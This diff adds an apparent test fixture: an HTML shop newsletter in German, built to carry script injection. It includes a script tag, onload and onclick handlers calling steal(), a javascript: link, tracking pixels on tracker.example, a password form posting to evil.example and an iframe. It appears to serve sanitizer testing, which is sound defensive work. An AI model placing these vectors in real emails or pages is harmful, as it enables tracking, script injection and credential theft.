@@ -1,0 +1,19 @@
+From: Newsletter <news@shop.example>
+To: patrick@example.org
+Subject: Angebote der Woche
+Date: Thu, 12 Mar 2026 08:00:00 +0000
+Message-ID: <news-42@shop.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Hidden title</title><style>body { background: url(https://tracker.example/bg.png); }</style>
+<script>alert("x")</script></head>
+<body onload="steal()">
+<h1 style="color: red; background-image: url('https://tracker.example/h.png')">Angebote</h1>
+<p>Nur heute: <a href="https://shop.example/deal" onclick="steal()">Zum Angebot</a></p>
+<p><a href="javascript:alert(1)">Bad link</a></p>
+<img src="https://cdn.shop.example/banner.jpg" alt="Banner" width="600">
+<img src="//tracker.example/pixel.gif" width="1" height="1">
+<form action="https://evil.example"><input name="password"></form>
+<iframe src="https://evil.example"></iframe>
+</body></html>
